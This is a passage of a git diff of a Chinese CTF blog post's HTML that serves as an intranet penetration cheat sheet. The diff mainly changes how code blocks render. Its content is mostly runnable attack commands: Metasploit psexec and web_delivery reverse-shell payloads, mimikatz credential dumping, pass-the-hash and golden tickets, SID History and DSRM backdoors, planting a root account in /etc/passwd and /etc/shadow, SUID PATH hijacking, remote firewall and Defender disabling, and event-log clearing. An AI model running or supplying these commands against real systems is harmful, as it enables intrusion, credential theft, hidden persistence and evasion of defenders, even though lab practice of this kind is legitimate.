255.255.255.0 1 #添加路由在msf上使用 route print #查看路由在msf上使用 run post/windows/gather/enum_patches #查看补丁情况 setg Proxies socks5:127.0.0.1:1080 #设置代理 show options lhost #显示lhost的设置 psexec传递 （确保已经设置好路由） use exploit/windows/smb/psexec set payload windows/x64/meterpreter/bind_tcp set rhost 10.10.10.10 set SMBUser administrator set SMBPass 1qaz@WSX run MSF使用ms17-010开启3389 use auxiliary/admin/smb/ms17_010_command set COMMAND REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal\\\" \\\"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f set rhost x.x.x.x MSF使用mimikatz（被kiwi取代） migrate [PID] #如果是x64需要这个步骤 load kiwi #加载模块 help kiwi #查看帮助 creds_all：列举所有凭据 creds_kerberos：列举所有kerberos凭据 creds_msv：列举所有msv凭据 creds_ssp：列举所有ssp凭据 creds_tspkg：列举所有tspkg凭据 creds_wdigest：列举所有wdigest凭据 dcsync：通过DCSync检索用户帐户信息 dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID golden_ticket_create：创建黄金票据 kerberos_ticket_list：列举kerberos票据 kerberos_ticket_purge：清除kerberos票据 kerberos_ticket_use：使用kerberos票据 kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令 lsa_dump_sam：dump出lsa的SAM lsa_dump_secrets：dump出lsa的密文 password_change：修改密码 wifi_list：列出当前用户的wifi配置文件 wifi_list_shared：列出共享wifi配置文件/编码 MSF smb爆破密码 use auxiliary/scanner/smb/smb_login set SMBUser administrator set PASS_FILE /root/fuzzDicts/passwordDict/top500.txt set rhost 192.168.93.10 exploit MSF 令牌偷取（用于提权） getuid #查看当前token use incognito #加载incognito list_tokens -u #列出AccessToken impersonate_token \"TEST\\adminitrator\" #模拟TEST\\adminitrator用户 rev2self #返回到之前的AccessToken权限 MSF存活主机探测 use auxiliary/scanner/discovery/udp_probe set rhosts 192.168.183.0/24 set threads 5 exploit MSF powershell 攻击 use exploit/multi/script/web_delivery set target 2 # 选择使用powershell类型的payload set payload windows/meterpreter/reverse_tcp set lport 2222 set lhost 192.168.135.150 exploit MSF清除痕迹 run event_manager -i run event_manager -c 小工具使用 Mimitakz使用 获取账号密码 privilege::debug #权限提升 sekurlsa::logonPasswords #获取账号密码 获取NTLM hash privilege::debug token::elevate lsadump::sam hash攻击 （会弹出一个cmd窗口，有风险） privilege::debug sekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46 #DC是域控的名称 ntlm是上述获得结果 Eeathworm使用 -l listenport open a port for the service startup. // 为服务启动打开一个端口。 -d refhost set the reflection host address. // 设置反连主机地址。 -e refport set the reflection port. // 设置反连端口。 -f connhost set the connect host address . // 设置连接主机地址。 -g connport set the connect port. // 设置连接端口。 -t usectime set the milliseconds for timeout. The default value is 1000 // 设置超时的毫秒数。默认值值为1000 -s state setup the function. // 状态设置功能。共有六种ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen ssocksd rcsocks rssocks 为socket5 正向代理，反向代理，正反向代理 lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。 lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。 lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。 proxychains4 使用方法 proxychains4 nmap -p 3389 -Pn -sT 192.168.52.141 # 需要配置/etc/proxychains4.conf文件 -Pn和-sT必须要有， 192.168.52.141是要扫描的内网地址 chisel使用 端口转发 #将本地的11111端口转发到服务器上的8000端口 正向链接 ./chisel server -p 12345 chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000 反向链接 chisel.exe server -p 12345 --reverse ./chisel client 192.168.61.129:12345 R:11111:127.0.0.1:8000 socks代理 本地1088端口代理服务器 正向链接 chisel.exe server -p 12345 --socks5 ./chisel client 192.168.61.129:12345 1088:socks 反向链接 ./chisel server -p 12345 --reverse --socks5 ./chisel client 192.168.111.2:12345 R:1088:socks 权限维持 黄金票据 导出域控制器用户密码或hash privilege::debug lsadump::lsa /patch # 专用于在域控制器上导出用户密码或hash 切换到用户主机下使用minikatz生成票据 kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi 修改票据 kerberos::purge #先清空所有票据 kerberos::ptt ticket.kirbi #再将生成的票据注入域用户主机Windows7中 kerberos::tgt #查看系统票据 SID History域后门 添加恶意用户 net user aaa Aaa123456 /add #添加用户名为aaa密码为Aaa123456的用户\r使用mimikatz将域管理员的SID添加到恶意域用户\nprivilege::debug sid::patch sid::add /sam:aaa /new:Administrator //将管理员Administrator的SID添加到用户aaa的SID History属性中 DSRM 后门 修改DSRM账户（需要远程登录调用cmd窗口，有危险） ntdsutil // 进入ntdsutil set dsrm password // 设置DSRM账户的密码 reset password on server null // 在当前域控制器上恢复DSRM密码 // 输入新密码 // 重新输入新密码 q //退出DSRM密码设置模式 q // 退出ntdsutil DSRM与域用户同步（于第一步类似，不必重复） ntdsutil // 进入ntdsutil set dsrm password // 设置DSRM账户的密码 sync from domain account domainusername // 使DSRM的密码和指定的domainusername域用户的密码同步 q //退出DSRM密码设置模式 q // 退出ntdsutil 启用DSRM登录 New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -name \"DsrmAdminLogonBehavior\" -value 2 -propertyType DWORD #powershell 或 reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 #cmd方式 mimikatz获取NTLM hash （见mimikate用法） mimikatz使用hash攻击 （见mimikate用法） 提权 Linux提取放行普通用户提权 创建普通用户（密码123456） echo 'meme:x:1001:1001:,,,:/home/meme:/bin/bash' \u003e\u003e /etc/passwd echo 'meme:x:1001:' \u003e\u003e /etc/group echo 'meme:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::' \u003e\u003e /etc/shadow echo 'meme:!::' \u003e\u003e /etc/gshadow 提权 echo 'ubuntu ALL=(ALL:ALL) ALL' \u003e\u003e /etc/sudoers #需要root权限才能做，不能使用sudo sudo su root #输入ubuntu用户的密码即可 创建root用户（密码123456） echo 'xi:x:0:0:root:/root:/bin/bash' \u003e\u003e /etc/passwd echo 'xi:x:0:' \u003e\u003e /etc/group echo 'xi:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::' \u003e\u003e /etc/shadow echo 'xi:!::' \u003e\u003e /etc/gshadow suid ps程序提权 前提条件，存在一个SUID程序，并且该程序调用ps命令 判断条件： find / -perm -u=s -type f 2\u003e/dev/null # 查找短暂拥有root权限的命令程序 修改环境变量，伪造ps命令 cd /tmp echo \"/bin/bash\" \u003e ps chmod 777 ps export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序 或 ln -s /bin/bash /tmp/ps 执行判断条件2中获取的程序。 警告：需要在反弹shell上使用，无法在webshell上成功执行和提权，需要全交交互式才行\nlinux ssh免登录方式 本地生成文件 ssh-keygen -t rsa #生成公钥和私钥 (echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") \u003e public.txt #到处公钥 (echo -e \"\\n\\n\"; cat /root/.ssh/id_rsa; echo -e \"\\n\\n\") \u003e private.txt #到处私钥 公钥上传 cp -avx ~/ubuntu/.ssh/id_rsa.pub ~/.ssh/authorized_keys #~/.ssh/authorized_keys 是上传的文件路径 echo '生成的.pub文件的内容即hello.pub' \u003e ~/.ssh/authorized_keys #写入文件 ",
   "wordCount" : "1290",
   "inLanguage": "zh",
   "datePublished": "2023-12-16T00:00:00Z",
@@ -210,7 +210,7 @@
     <div class="post-description">
       内网安全
     </div>
-    <div class="post-meta"><span title='2023-12-16 00:00:00 +0000 UTC'>十二月 16, 2023</span>&nbsp;·&nbsp;7 分钟&nbsp;·&nbsp;Rural Bee&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/ctf/ctf_intranet.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+    <div class="post-meta"><span title='2023-12-16 00:00:00 +0000 UTC'>十二月 16, 2023</span>&nbsp;·&nbsp;7 分钟&nbsp;·&nbsp;Rural Bee
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -387,131 +387,131 @@
 </li>
 <li>
 <p>namp</p>
-<pre tabindex="0"><code>nmap 192.168.111.129`   # 探测存在的服务
-nmap -T4 -sC -sV 192.168.1.8 
--p: 指定端口扫描范围
--F：扫描比缺省少的端口
--A：使能系统探测、版本检测、脚本扫描、路由追踪
--O：探测指定IP的相关数据。
--sP：主机探测
--sL:列出需要扫描的目标，不扫描
--sn:只做ping扫描，不做端口扫描
--Pn：跳过主机发现，视所有主机都在线
--PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现
--PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现
--PO[Protocol list]：基于IP协议字段的ping扫描
--n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析
---dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS 服务器
---system-dns:调用系统的DNS服务器
---traceroute：显示追踪到目标的路径
-
--sS/sT/sA/sW/sM:TCP扫描
--sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放
--sT是全连接扫描会和服务器建立完整的三次握手，效率低
--sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件
--sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包
--sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准
--sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文
--sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。
--sY/sZ:SCTP协议INIT或cookie-echo扫描
--sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测
--b &lt;FTP relay host&gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的
-</code></pre></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap 192.168.111.129`   # 探测存在的服务
+</span></span><span class="line"><span class="cl">nmap -T4 -sC -sV 192.168.1.8 
+</span></span><span class="line"><span class="cl">-p: 指定端口扫描范围
+</span></span><span class="line"><span class="cl">-F：扫描比缺省少的端口
+</span></span><span class="line"><span class="cl">-A：使能系统探测、版本检测、脚本扫描、路由追踪
+</span></span><span class="line"><span class="cl">-O：探测指定IP的相关数据。
+</span></span><span class="line"><span class="cl">-sP：主机探测
+</span></span><span class="line"><span class="cl">-sL:列出需要扫描的目标，不扫描
+</span></span><span class="line"><span class="cl">-sn:只做ping扫描，不做端口扫描
+</span></span><span class="line"><span class="cl">-Pn：跳过主机发现，视所有主机都在线
+</span></span><span class="line"><span class="cl">-PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现
+</span></span><span class="line"><span class="cl">-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现
+</span></span><span class="line"><span class="cl">-PO[Protocol list]：基于IP协议字段的ping扫描
+</span></span><span class="line"><span class="cl">-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析
+</span></span><span class="line"><span class="cl">--dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS 服务器
+</span></span><span class="line"><span class="cl">--system-dns:调用系统的DNS服务器
+</span></span><span class="line"><span class="cl">--traceroute：显示追踪到目标的路径
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-sS/sT/sA/sW/sM:TCP扫描
+</span></span><span class="line"><span class="cl">-sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放
+</span></span><span class="line"><span class="cl">-sT是全连接扫描会和服务器建立完整的三次握手，效率低
+</span></span><span class="line"><span class="cl">-sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件
+</span></span><span class="line"><span class="cl">-sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包
+</span></span><span class="line"><span class="cl">-sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准
+</span></span><span class="line"><span class="cl">-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文
+</span></span><span class="line"><span class="cl">-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。
+</span></span><span class="line"><span class="cl">-sY/sZ:SCTP协议INIT或cookie-echo扫描
+</span></span><span class="line"><span class="cl">-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测
+</span></span><span class="line"><span class="cl">-b &lt;FTP relay host&gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的
+</span></span></code></pre></div></li>
 </ol>
 <h2 id="linux">Linux<a hidden class="anchor" aria-hidden="true" href="#linux">#</a></h2>
 <h3 id="常见命令">常见命令<a hidden class="anchor" aria-hidden="true" href="#常见命令">#</a></h3>
-<pre tabindex="0"><code>uname -a    # 获取所有版本信息
-uname -m    # 获取Linux内核架构
-cat /proc/version    # 获取内核信息 
-cat /etc/*-release   # 发布信息
-cat /etc/issue    # 发布信息
-hostname    # 获取主机名
-cat /etc/passwd    # 列出系统所有用户 
-cat /etc/group    # 列出系统所有组 
-w    # 查看目前登录的用户
-whoami    # 查看当前用户 
-id    # 查看当前用户信息 
-sudo -l    # 列出目前用户可执行与无法执行的指令 
-ps aux    # 查看进程信息 
-ls -la /etc/cron*    # 查看计划任务
-ifconfig -a    # 列出网络接口信息 
-cat /etc/network/interfaces    # 列出网络接口信息 
-arp -a    # 查看系统arp表 
-route    # 打印路由信息
-netstat -anplt    # 打印本地端口开放信息 
-iptables -L    # 列出iptable的配置规则
-nohup 命令 &amp; #后台运行
-</code></pre><h2 id="windows">Windows<a hidden class="anchor" aria-hidden="true" href="#windows">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uname -a    # 获取所有版本信息
+</span></span><span class="line"><span class="cl">uname -m    # 获取Linux内核架构
+</span></span><span class="line"><span class="cl">cat /proc/version    # 获取内核信息 
+</span></span><span class="line"><span class="cl">cat /etc/*-release   # 发布信息
+</span></span><span class="line"><span class="cl">cat /etc/issue    # 发布信息
+</span></span><span class="line"><span class="cl">hostname    # 获取主机名
+</span></span><span class="line"><span class="cl">cat /etc/passwd    # 列出系统所有用户 
+</span></span><span class="line"><span class="cl">cat /etc/group    # 列出系统所有组 
+</span></span><span class="line"><span class="cl">w    # 查看目前登录的用户
+</span></span><span class="line"><span class="cl">whoami    # 查看当前用户 
+</span></span><span class="line"><span class="cl">id    # 查看当前用户信息 
+</span></span><span class="line"><span class="cl">sudo -l    # 列出目前用户可执行与无法执行的指令 
+</span></span><span class="line"><span class="cl">ps aux    # 查看进程信息 
+</span></span><span class="line"><span class="cl">ls -la /etc/cron*    # 查看计划任务
+</span></span><span class="line"><span class="cl">ifconfig -a    # 列出网络接口信息 
+</span></span><span class="line"><span class="cl">cat /etc/network/interfaces    # 列出网络接口信息 
+</span></span><span class="line"><span class="cl">arp -a    # 查看系统arp表 
+</span></span><span class="line"><span class="cl">route    # 打印路由信息
+</span></span><span class="line"><span class="cl">netstat -anplt    # 打印本地端口开放信息 
+</span></span><span class="line"><span class="cl">iptables -L    # 列出iptable的配置规则
+</span></span><span class="line"><span class="cl">nohup 命令 &amp; #后台运行
+</span></span></code></pre></div><h2 id="windows">Windows<a hidden class="anchor" aria-hidden="true" href="#windows">#</a></h2>
 <h3 id="初步收集">初步收集<a hidden class="anchor" aria-hidden="true" href="#初步收集">#</a></h3>
 <ol>
 <li>查看基本信息命令</li>
 </ol>
-<pre tabindex="0"><code> ipconfig /all   # 查看本机ip，所在域
- route print     # 打印路由信息
- net view        # 查看局域网内其他主机名
- net view /domain # 查看主域信息
- arp -a          # 查看arp缓存
- net start       # 查看开启了哪些服务
- net share       # 查看开启了哪些共享
- net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
- echo %PROCESSOR_ARCHITECTURE%    // 查看系统体系结构
- systeminfo    // 查看操作系统信息
- nslookup god.org		#nslookup直接解析域名服务器
- net user                 # 查看本机用户列表
- net user /domain         # 查看域用户
- net localgroup administrators    # 查看本地管理员组（通常会有域用户）
- net computers # 查看连接的电脑
- net view /domain         # 查看有几个域
- net user &#34;用户名&#34; /domain   # 获取指定域用户的信息
- net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
- net group &#34;组名&#34; /domain    # 查看域中某工作组
- net group &#34;domain admins&#34; /domain  # 查看域管理员的名字
- net group &#34;domain computers&#34; /domain  # 查看域中的其他主机名
- net group &#34;doamin controllers&#34; /domain  # 查看域控制器（可能有多台）
- net group &#34;Enterprise Admins&#34; /domain    // 查看域管理员组
- net accounts /domain  #查看域密码信息
- nltest /domain_trusts #查看域信任信息
-</code></pre><ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ipconfig /all   # 查看本机ip，所在域
+</span></span><span class="line"><span class="cl"> route print     # 打印路由信息
+</span></span><span class="line"><span class="cl"> net view        # 查看局域网内其他主机名
+</span></span><span class="line"><span class="cl"> net view /domain # 查看主域信息
+</span></span><span class="line"><span class="cl"> arp -a          # 查看arp缓存
+</span></span><span class="line"><span class="cl"> net start       # 查看开启了哪些服务
+</span></span><span class="line"><span class="cl"> net share       # 查看开启了哪些共享
+</span></span><span class="line"><span class="cl"> net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+</span></span><span class="line"><span class="cl"> echo %PROCESSOR_ARCHITECTURE%    // 查看系统体系结构
+</span></span><span class="line"><span class="cl"> systeminfo    // 查看操作系统信息
+</span></span><span class="line"><span class="cl"> nslookup god.org		#nslookup直接解析域名服务器
+</span></span><span class="line"><span class="cl"> net user                 # 查看本机用户列表
+</span></span><span class="line"><span class="cl"> net user /domain         # 查看域用户
+</span></span><span class="line"><span class="cl"> net localgroup administrators    # 查看本地管理员组（通常会有域用户）
+</span></span><span class="line"><span class="cl"> net computers # 查看连接的电脑
+</span></span><span class="line"><span class="cl"> net view /domain         # 查看有几个域
+</span></span><span class="line"><span class="cl"> net user &#34;用户名&#34; /domain   # 获取指定域用户的信息
+</span></span><span class="line"><span class="cl"> net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+</span></span><span class="line"><span class="cl"> net group &#34;组名&#34; /domain    # 查看域中某工作组
+</span></span><span class="line"><span class="cl"> net group &#34;domain admins&#34; /domain  # 查看域管理员的名字
+</span></span><span class="line"><span class="cl"> net group &#34;domain computers&#34; /domain  # 查看域中的其他主机名
+</span></span><span class="line"><span class="cl"> net group &#34;doamin controllers&#34; /domain  # 查看域控制器（可能有多台）
+</span></span><span class="line"><span class="cl"> net group &#34;Enterprise Admins&#34; /domain    // 查看域管理员组
+</span></span><span class="line"><span class="cl"> net accounts /domain  #查看域密码信息
+</span></span><span class="line"><span class="cl"> nltest /domain_trusts #查看域信任信息
+</span></span></code></pre></div><ol start="2">
 <li>net添加用户</li>
 </ol>
-<pre tabindex="0"><code>net user &#34;username&#34; &#34;password&#34; /add  #添加账户名和密码的用户, 不用双引号也可以
-net localgroup administrators &#34;username&#34; /add #将用户添加到本地管理员中
-</code></pre><ol start="3">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user &#34;username&#34; &#34;password&#34; /add  #添加账户名和密码的用户, 不用双引号也可以
+</span></span><span class="line"><span class="cl">net localgroup administrators &#34;username&#34; /add #将用户添加到本地管理员中
+</span></span></code></pre></div><ol start="3">
 <li>net共享盘符连接</li>
 </ol>
-<pre tabindex="0"><code>net use         # 查看与本机的共享链接
-net view \\IP      #查看远程主机开启的默认共享
-net share       # 查看本机开启了哪些共享
-net share ipc$  # 开启本机ipc共享
-net share c$    # 开启本机c盘共享
-net use \\IP\ipc$ &#34;password&#34; /user:&#34;username&#34;  #建立空连接
-net use z: \\IP\c$ &#34;password&#34; /user:&#34;username&#34;  #建立共享盘符
-net use \\IP\ipc$ /del #删除空连接
-net use z: /del #删除本机映射的z盘 
-net use * /del #删除本机所有映射和IPC$连接 
-dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目
-录下的文件
-copy mimikatz.exe \\192.168.138.138\c$  #复制文件到目标ip的c盘下面
-</code></pre><ol start="4">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use         # 查看与本机的共享链接
+</span></span><span class="line"><span class="cl">net view \\IP      #查看远程主机开启的默认共享
+</span></span><span class="line"><span class="cl">net share       # 查看本机开启了哪些共享
+</span></span><span class="line"><span class="cl">net share ipc$  # 开启本机ipc共享
+</span></span><span class="line"><span class="cl">net share c$    # 开启本机c盘共享
+</span></span><span class="line"><span class="cl">net use \\IP\ipc$ &#34;password&#34; /user:&#34;username&#34;  #建立空连接
+</span></span><span class="line"><span class="cl">net use z: \\IP\c$ &#34;password&#34; /user:&#34;username&#34;  #建立共享盘符
+</span></span><span class="line"><span class="cl">net use \\IP\ipc$ /del #删除空连接
+</span></span><span class="line"><span class="cl">net use z: /del #删除本机映射的z盘 
+</span></span><span class="line"><span class="cl">net use * /del #删除本机所有映射和IPC$连接 
+</span></span><span class="line"><span class="cl">dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目
+</span></span><span class="line"><span class="cl">录下的文件
+</span></span><span class="line"><span class="cl">copy mimikatz.exe \\192.168.138.138\c$  #复制文件到目标ip的c盘下面
+</span></span></code></pre></div><ol start="4">
 <li>计划任务</li>
 </ol>
-<pre tabindex="0"><code>schtasks /query /tn taskName #查看计划任务，不加/tn为所有计划任务
-schtasks /create /tn &#34;taskName&#34; /tr C:\shell.exe /sc once /st 18:05 /S 192.168.52.138 /RU System /RL HIGHEST /u administrator /p &#34;Liu78963&#34;   #创建计划任务，18:05分启动，就启动一次，计划任务名称为taskName
-schtasks /delete /tn taskName #删除计划任务
-</code></pre><ol start="5">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">schtasks /query /tn taskName #查看计划任务，不加/tn为所有计划任务
+</span></span><span class="line"><span class="cl">schtasks /create /tn &#34;taskName&#34; /tr C:\shell.exe /sc once /st 18:05 /S 192.168.52.138 /RU System /RL HIGHEST /u administrator /p &#34;Liu78963&#34;   #创建计划任务，18:05分启动，就启动一次，计划任务名称为taskName
+</span></span><span class="line"><span class="cl">schtasks /delete /tn taskName #删除计划任务
+</span></span></code></pre></div><ol start="5">
 <li>netstat 查看端口是否开放</li>
 </ol>
-<pre tabindex="0"><code>netstat -ano | find &#34;3389&#34;
-</code></pre><ol start="6">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -ano | find &#34;3389&#34;
+</span></span></code></pre></div><ol start="6">
 <li>开启3389命令</li>
 </ol>
-<pre tabindex="0"><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
-</code></pre><ol start="7">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</span></span></code></pre></div><ol start="7">
 <li>查看进程并删除</li>
 </ol>
-<pre tabindex="0"><code>tasklist | findstr &#34;artifact&#34;
-taskkill /pid 2888 -f
-</code></pre><ol start="8">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist | findstr &#34;artifact&#34;
+</span></span><span class="line"><span class="cl">taskkill /pid 2888 -f
+</span></span></code></pre></div><ol start="8">
 <li>
 <p>关闭防火墙</p>
 <ul>
@@ -519,20 +519,20 @@ taskkill /pid 2888 -f
 </ul>
 </li>
 </ol>
-<pre tabindex="0"><code>netsh advfirewall set allprofiles state off  
-net stop windefend
-netsh advfirewall firewall set rule group=&#34;Remote Desktop&#34; new enable=yes #防火墙设置白名单
-</code></pre><pre><code>- 远程关闭
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netsh advfirewall set allprofiles state off  
+</span></span><span class="line"><span class="cl">net stop windefend
+</span></span><span class="line"><span class="cl">netsh advfirewall firewall set rule group=&#34;Remote Desktop&#34; new enable=yes #防火墙设置白名单
+</span></span></code></pre></div><pre><code>- 远程关闭
 </code></pre>
-<pre tabindex="0"><code>net use \\192.168.93.10\ipc$ &#34;dc123.com&#34; /user:&#34;administrator&#34;
-sc \\192.168.93.10 create unablefirewall binpath= &#34;netsh advfirewall set allprofiles state off&#34;
-sc \\192.168.93.10 start unablefirewall
-net use \\192.168.93.10\ipc$ /del
-</code></pre><ol start="9">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use \\192.168.93.10\ipc$ &#34;dc123.com&#34; /user:&#34;administrator&#34;
+</span></span><span class="line"><span class="cl">sc \\192.168.93.10 create unablefirewall binpath= &#34;netsh advfirewall set allprofiles state off&#34;
+</span></span><span class="line"><span class="cl">sc \\192.168.93.10 start unablefirewall
+</span></span><span class="line"><span class="cl">net use \\192.168.93.10\ipc$ /del
+</span></span></code></pre></div><ol start="9">
 <li>开启远程桌面</li>
 </ol>
-<pre tabindex="0"><code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1  #开启远程桌面功能
-</code></pre><ol start="10">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1  #开启远程桌面功能
+</span></span></code></pre></div><ol start="10">
 <li>
 <p>程序异常弹窗解决</p>
 <ul>
@@ -540,230 +540,230 @@ net use \\192.168.93.10\ipc$ /del
 </ul>
 </li>
 </ol>
-<pre tabindex="0"><code>reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;DontShowUI&#34; /t REG_DWORD /d 1 /f
-reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;Disabled&#34; /t REG_DWORD /d 1 /f
-reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;LoggingDisabled&#34; /t REG_DWORD /d 1 /f
-reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;DontSendAdditionalData&#34; /t REG_DWORD /d 1 /f
-</code></pre><pre><code>- 开启所有程序异常弹窗
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;DontShowUI&#34; /t REG_DWORD /d 1 /f
+</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;Disabled&#34; /t REG_DWORD /d 1 /f
+</span></span><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting&#34; /v &#34;LoggingDisabled&#34; /t REG_DWORD /d 1 /f
